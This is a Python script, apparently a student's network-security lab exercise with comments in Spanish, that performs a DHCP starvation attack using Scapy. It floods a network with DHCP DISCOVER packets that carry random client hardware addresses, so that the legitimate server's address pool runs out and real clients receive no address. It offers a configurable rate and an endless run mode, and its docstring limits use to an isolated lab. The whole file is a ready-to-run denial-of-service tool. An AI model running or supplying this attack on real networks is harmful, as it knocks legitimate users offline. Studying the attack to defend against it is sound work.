#!/usr/bin/env python3
"""
dhcp_starvation.py — DHCP Pool Exhaustion
==========================================
Envía DHCP DISCOVERs con chaddr aleatorios para agotar el pool
del servidor DHCP legítimo. Cada chaddr único consume un lease.

Mecanismo:
  - BOOTP/DHCP identifica clientes por chaddr (hardware address)
  - chaddr distinto por paquete → lease distinto reservado en el server
  - Pool 192.168.92.0/24 tiene ~244 IPs libres → se agotan rápido
  - Clientes legítimos reciben DHCPNAK o no reciben respuesta

Autor     : Julio Pujols — Matrícula: 20250692
Red       : 192.168.92.0/24
Requisitos: Python 3.6+ | Scapy >= 2.4.0 | root/sudo
[LAB]     : Uso exclusivo en entorno de laboratorio aislado.
"""

import argparse
import random
import signal
import sys
import time

from scapy.all import BOOTP, DHCP, IP, UDP, Ether, conf, sendp

_stats = {"sent": 0, "t0": 0.0}


def _sigint(sig, frame):
    t = time.time() - _stats["t0"]
    print(f"\n[!] Detenido — {_stats['sent']} DISCOVERs en {t:.1f}s")
    sys.exit(0)


def _rand_mac_bytes() -> bytes:
    return bytes(random.randint(0, 255) for _ in range(6))


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _build_discover(chaddr: bytes):
    """
    DHCP DISCOVER broadcast con chaddr aleatorio.
    sport=68 dport=67 → cliente a servidor (RFC 2131).
    xid aleatorio → evita que el server correlacione peticiones.
    """
    return (
        Ether(src=_mac_str(chaddr), dst="ff:ff:ff:ff:ff:ff")
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=68, dport=67)
        / BOOTP(op=1, chaddr=chaddr,
                xid=random.randint(0, 0xFFFFFFFF))
        / DHCP(options=[
            ("message-type", "discover"),
            ("hostname", "lab-client"),
            ("param_req_list", [1, 3, 6, 15]),
            "end",
        ])
    )


def main():
    parser = argparse.ArgumentParser(
        description="DHCP Starvation — agota el pool del servidor DHCP"
    )
    parser.add_argument("-i", "--iface", required=True,
                        help="Interfaz de red (ej: eth0)")
    parser.add_argument("-r", "--rate", type=float, default=5.0,
                        help="DISCOVERs/segundo (default: 5)")
    parser.add_argument("-c", "--count", type=int, default=0,
                        help="Total a enviar (0 = infinito)")
    args = parser.parse_args()

    conf.verb = 0
    signal.signal(signal.SIGINT, _sigint)
    interval = 1.0 / args.rate

    print(f"[*] DHCP Starvation | iface={args.iface} rate={args.rate}/s")
    print("[*] Ctrl+C para detener\n")

    _stats["t0"] = time.time()
    while True:
        chaddr = _rand_mac_bytes()
        sendp(_build_discover(chaddr), iface=args.iface, verbose=False)
        _stats["sent"] += 1

        if _stats["sent"] % 10 == 0:
            t = time.time() - _stats["t0"]
            print(f"\r[+] {_stats['sent']} DISCOVERs | {_stats['sent']/t:.1f}/s",
                  end="", flush=True)

        if args.count and _stats["sent"] >= args.count:
            _sigint(None, None)

        time.sleep(interval)


if __name__ == "__main__":
    main()
